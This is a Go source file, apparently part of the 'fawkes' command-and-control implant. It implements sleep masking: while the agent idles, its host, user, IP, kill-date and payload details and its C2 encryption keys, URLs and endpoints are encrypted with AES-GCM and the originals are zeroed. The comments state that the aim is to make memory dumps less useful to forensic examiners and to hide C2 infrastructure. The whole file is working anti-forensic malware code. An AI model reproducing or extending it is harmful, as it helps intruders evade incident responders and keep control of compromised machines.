package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"log"

	"fawkes/pkg/commands"
	fhttp "fawkes/pkg/http"
	"fawkes/pkg/profiles"
	"fawkes/pkg/structs"
)

// sleepVault holds encrypted copies of sensitive agent, C2 profile, and TCP P2P
// data during sleep cycles. While the agent sleeps, original struct fields are
// zeroed and data lives only in the encrypted vault — making memory dumps
// during sleep far less useful for forensic analysis.
//
// State that CANNOT be encrypted during sleep (documented for completeness):
//   - SOCKS manager: live net.Conn handles cannot be serialized/encrypted
//   - RPFWD manager: live net.Listener and net.Conn handles
//   - File transfer channels: Go channels have no serialization API
//   - HTTP client: internal transport/TLS state not accessible
//   - TCP P2P parent/child connections: live net.Conn handles
//
// These are acceptable because: (1) connection handles alone don't reveal C2
// infrastructure, and (2) the sleep mask only activates when no tasks are
// running, meaning most of these resources are idle or empty.
type sleepVault struct {
	key           []byte // Random AES-256-GCM key for this sleep cycle
	agentBlob     []byte // Encrypted agent sensitive fields
	profileBlob   []byte // Encrypted C2 profile sensitive fields
	profileMasked bool   // Whether C2 profile fields were encrypted
	tcpBlob       []byte // Encrypted TCP P2P profile sensitive fields
	tcpMasked     bool   // Whether TCP P2P profile fields were encrypted
}

// agentSensitiveData holds the Agent struct fields that could identify the
// agent or reveal operational details in a memory dump.
type agentSensitiveData struct {
	PayloadUUID string `json:"u"`
	Domain      string `json:"d"`
	Host        string `json:"h"`
	User        string `json:"w"`
	InternalIP  string `json:"i"`
	ExternalIP  string `json:"e"`
	ProcessName string `json:"p"`
	Description string `json:"s"`
	// Operational fields — reveal agent scheduling and targeting
	Architecture string `json:"a,omitempty"`
	OS           string `json:"o,omitempty"`
	KillDate     int64  `json:"k,omitempty"`
	DefaultPPID  int    `json:"pp,omitempty"`
}

// profileSensitiveData holds the HTTP C2 profile fields that reveal the
// C2 infrastructure or allow decryption of captured traffic.
type profileSensitiveData struct {
	EncryptionKey string            `json:"k"`
	BaseURL       string            `json:"b"`
	UserAgent     string            `json:"a"`
	CallbackUUID  string            `json:"c"`
	HostHeader    string            `json:"h"`
	GetEndpoint   string            `json:"g"`
	PostEndpoint  string            `json:"p"`
	CustomHeaders map[string]string `json:"x,omitempty"`
}

// tcpSensitiveData holds the TCP P2P profile fields that reveal encryption
// keys, callback identity, and bind addresses. These are often duplicates
// of HTTP profile values — both must be zeroed to prevent forensic recovery.
type tcpSensitiveData struct {
	EncryptionKey string `json:"k"`
	CallbackUUID  string `json:"c"`
	BindAddress   string `json:"b,omitempty"`
}

// obfuscateSleep encrypts sensitive agent, C2 profile, and TCP P2P data
// before the agent enters a sleep cycle. The original struct fields are
// zeroed so a process memory dump during sleep only reveals the encrypted vault.
//
// Masking is skipped entirely when tasks are running. Running task goroutines
// hold pointers to the agent and C2 profile structs — zeroing fields while
// goroutines use them for PostResponse/GetTasking is a data race. The sleep
// mask provides its primary value during idle periods (no pending tasks).
//
// Returns a vault that must be passed to deobfuscateSleep on wakeup.
// Returns nil if encryption fails or tasks are running.
func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
	// Skip sleep masking entirely when tasks are running.
	// Task goroutines read agent fields and C2 profile fields concurrently —
	// zeroing those fields would be a data race causing silent failures.
	running := commands.GetRunningTasks()
	if len(running) > 0 {
		return nil
	}

	vault := &sleepVault{}

	// Generate random AES-256 key for this sleep cycle
	vault.key = make([]byte, 32)
	if _, err := rand.Read(vault.key); err != nil {
		log.Printf("[WARNING] Sleep mask: key generation failed: %v", err)
		return nil
	}

	// --- Encrypt agent sensitive fields ---
	ad := agentSensitiveData{
		PayloadUUID:  agent.PayloadUUID,
		Domain:       agent.Domain,
		Host:         agent.Host,
		User:         agent.User,
		InternalIP:   agent.InternalIP,
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Description:  agent.Description,
		Architecture: agent.Architecture,
		OS:           agent.OS,
		KillDate:     agent.KillDate,
		DefaultPPID:  agent.DefaultPPID,
	}
	plaintext, err := json.Marshal(ad)
	if err != nil {
		log.Printf("[WARNING] Sleep mask: agent marshal failed: %v", err)
		zeroBytes(vault.key)
		return nil
	}
	vault.agentBlob = sleepEncrypt(vault.key, plaintext)
	zeroBytes(plaintext)
	if vault.agentBlob == nil {
		zeroBytes(vault.key)
		return nil
	}

	// Zero agent sensitive fields
	agent.PayloadUUID = ""
	agent.Domain = ""
	agent.Host = ""
	agent.User = ""
	agent.InternalIP = ""
	agent.ExternalIP = ""
	agent.ProcessName = ""
	agent.Description = ""
	agent.Architecture = ""
	agent.OS = ""
	agent.KillDate = 0
	agent.DefaultPPID = 0

	// --- Encrypt HTTP C2 profile ---
	// Safe because we already confirmed no tasks running.
	if hp, ok := c2.(*fhttp.HTTPProfile); ok {
		pd := profileSensitiveData{
			EncryptionKey: hp.EncryptionKey,
			BaseURL:       hp.BaseURL,
			UserAgent:     hp.UserAgent,
			CallbackUUID:  hp.CallbackUUID,
			HostHeader:    hp.HostHeader,
			GetEndpoint:   hp.GetEndpoint,
			PostEndpoint:  hp.PostEndpoint,
			CustomHeaders: hp.CustomHeaders,
		}
		pPlain, pErr := json.Marshal(pd)
		if pErr == nil {
			vault.profileBlob = sleepEncrypt(vault.key, pPlain)
			zeroBytes(pPlain)
			if vault.profileBlob != nil {
				hp.EncryptionKey = ""
				hp.BaseURL = ""
				hp.UserAgent = ""
				hp.CallbackUUID = ""
				hp.HostHeader = ""
				hp.GetEndpoint = ""
				hp.PostEndpoint = ""
				hp.CustomHeaders = nil
				vault.profileMasked = true
			}
		}
	}

	// --- Encrypt TCP P2P profile ---
	// The TCP profile holds a copy of EncryptionKey and CallbackUUID — if we
	// only zero the HTTP profile copy, a forensic examiner can still recover
	// these values from the TCP profile's fields.
	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil {
		td := tcpSensitiveData{
			EncryptionKey: tcpP2P.EncryptionKey,
			CallbackUUID:  tcpP2P.CallbackUUID,
			BindAddress:   tcpP2P.BindAddress,
		}
		tPlain, tErr := json.Marshal(td)
		if tErr == nil {
			vault.tcpBlob = sleepEncrypt(vault.key, tPlain)
			zeroBytes(tPlain)
			if vault.tcpBlob != nil {
				tcpP2P.EncryptionKey = ""
				tcpP2P.CallbackUUID = ""
				tcpP2P.BindAddress = ""
				vault.tcpMasked = true
			}
		}
	}

	return vault
}

// deobfuscateSleep restores sensitive data from the encrypted vault after
// the agent wakes from sleep. The vault's key and blobs are zeroed after
// restoration to minimize the window where both plaintext and ciphertext
// exist in memory simultaneously.
func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profile) {
	if vault == nil || vault.key == nil {
		return
	}

	// Restore agent fields
	if vault.agentBlob != nil {
		plaintext := sleepDecrypt(vault.key, vault.agentBlob)
		if plaintext != nil {
			var ad agentSensitiveData
			if err := json.Unmarshal(plaintext, &ad); err == nil {
				agent.PayloadUUID = ad.PayloadUUID
				agent.Domain = ad.Domain
				agent.Host = ad.Host
				agent.User = ad.User
				agent.InternalIP = ad.InternalIP
				agent.ExternalIP = ad.ExternalIP
				agent.ProcessName = ad.ProcessName
				agent.Description = ad.Description
				agent.Architecture = ad.Architecture
				agent.OS = ad.OS
				agent.KillDate = ad.KillDate
				agent.DefaultPPID = ad.DefaultPPID
			}
			zeroBytes(plaintext)
		}
		zeroBytes(vault.agentBlob)
		vault.agentBlob = nil
	}

	// Restore HTTP profile fields
	if vault.profileMasked && vault.profileBlob != nil {
		if hp, ok := c2.(*fhttp.HTTPProfile); ok {
			plaintext := sleepDecrypt(vault.key, vault.profileBlob)
			if plaintext != nil {
				var pd profileSensitiveData
				if err := json.Unmarshal(plaintext, &pd); err == nil {
					hp.EncryptionKey = pd.EncryptionKey
					hp.BaseURL = pd.BaseURL
					hp.UserAgent = pd.UserAgent
					hp.CallbackUUID = pd.CallbackUUID
					hp.HostHeader = pd.HostHeader
					hp.GetEndpoint = pd.GetEndpoint
					hp.PostEndpoint = pd.PostEndpoint
					hp.CustomHeaders = pd.CustomHeaders
				}
				zeroBytes(plaintext)
			}
		}
		zeroBytes(vault.profileBlob)
		vault.profileBlob = nil
	}

	// Restore TCP P2P profile fields
	if vault.tcpMasked && vault.tcpBlob != nil {
		if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil {
			plaintext := sleepDecrypt(vault.key, vault.tcpBlob)
			if plaintext != nil {
				var td tcpSensitiveData
				if err := json.Unmarshal(plaintext, &td); err == nil {
					tcpP2P.EncryptionKey = td.EncryptionKey
					tcpP2P.CallbackUUID = td.CallbackUUID
					tcpP2P.BindAddress = td.BindAddress
				}
				zeroBytes(plaintext)
			}
		}
		zeroBytes(vault.tcpBlob)
		vault.tcpBlob = nil
	}

	// Zero the vault key
	zeroBytes(vault.key)
	vault.key = nil
}

// sleepEncrypt encrypts plaintext with AES-256-GCM. The nonce is prepended
// to the ciphertext. Returns nil on any error.
func sleepEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

// sleepDecrypt decrypts AES-256-GCM ciphertext with prepended nonce.
// Returns nil on any error (wrong key, corrupt data, etc.).
func sleepDecrypt(key, ciphertext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+1 {
		return nil
	}
	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plaintext
}
